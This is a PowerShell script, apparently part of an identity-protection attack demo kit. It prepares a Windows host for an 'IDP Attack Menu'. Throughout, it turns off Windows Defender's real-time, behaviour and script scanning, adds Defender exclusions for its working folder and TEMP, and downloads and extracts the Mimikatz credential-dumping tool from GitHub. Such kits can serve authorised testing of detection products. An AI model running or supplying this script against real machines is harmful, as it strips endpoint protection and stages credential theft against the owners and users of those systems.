# ============================================================
#  Unmanaged Host Prep — Disable Defender + Download Mimikatz
#  Run FIRST, before the IDP Attack Menu
# ============================================================

$ErrorActionPreference = "SilentlyContinue"
$idpDir = "C:\IDP_Files"
$mimiDir = "$idpDir\Mimikatz"
$mimiExe = "$mimiDir\x64\mimikatz.exe"
$mimiZip = "$env:TEMP\mimikatz.zip"

# --- Step 1: Check and Disable Defender ---
Write-Host "`n[*] Step 1: Windows Defender Status" -ForegroundColor Cyan

$defenderStatus = Get-MpPreference
if ($defenderStatus.DisableRealtimeMonitoring -eq $true) {
    Write-Host "[+] Real-time protection already disabled." -ForegroundColor Green
} else {
    Write-Host "[-] Real-time protection is ON. Disabling..." -ForegroundColor Yellow
    try {
        Set-MpPreference -DisableRealtimeMonitoring $true
        Set-MpPreference -DisableIOAVProtection $true
        Set-MpPreference -DisableBehaviorMonitoring $true
        Set-MpPreference -DisableScriptScanning $true
        Add-MpPreference -ExclusionPath $idpDir
        Add-MpPreference -ExclusionPath "$env:TEMP"
        Write-Host "[+] Defender real-time protection disabled." -ForegroundColor Green
    } catch {
        Write-Host "[!] Could not disable Defender. Tamper Protection may be on." -ForegroundColor Red
        Write-Host "[!] Disable manually: Windows Security > Virus & Threat > Manage Settings > Tamper Protection OFF" -ForegroundColor Red
        pause
        exit 1
    }
}

# Verify
Start-Sleep -Seconds 2
$check = Get-MpPreference
if ($check.DisableRealtimeMonitoring -ne $true) {
    Write-Host "[!] WARNING: Defender still active." -ForegroundColor Red
    $continue = Read-Host "Continue anyway? (y/N)"
    if ($continue -ne 'y') { exit 1 }
}

# --- Step 2: Download Mimikatz ---
Write-Host "`n[*] Step 2: Mimikatz" -ForegroundColor Cyan

New-Item -ItemType Directory -Path $idpDir -Force | Out-Null

if (Test-Path $mimiExe) {
    Write-Host "[+] Mimikatz already present at $mimiExe" -ForegroundColor Green
} else {
    Write-Host "[-] Downloading mimikatz..." -ForegroundColor Yellow
    $mimiUrl = "https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip"
    try {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        Invoke-WebRequest -Uri $mimiUrl -OutFile $mimiZip -UseBasicParsing
        Expand-Archive -Path $mimiZip -DestinationPath $mimiDir -Force
        Remove-Item $mimiZip -Force
        Write-Host "[+] Mimikatz extracted to $mimiDir" -ForegroundColor Green
    } catch {
        Write-Host "[!] Download failed: $_" -ForegroundColor Red
        pause
        exit 1
    }
}

# Verify mimikatz exists
if (-not (Test-Path $mimiExe)) {
    Write-Host "[!] mimikatz.exe not found at $mimiExe — checking subfolder..." -ForegroundColor Yellow
    $found = Get-ChildItem -Path $mimiDir -Recurse -Filter "mimikatz.exe" | Select-Object -First 1
    if ($found) {
        Write-Host "[+] Found at: $($found.FullName)" -ForegroundColor Green
    } else {
        Write-Host "[!] Not found. Download manually." -ForegroundColor Red
        pause
        exit 1
    }
}

Write-Host "`n[+] Prep complete. Run IDP_Attack_Menu.ps1 next." -ForegroundColor Green
pause
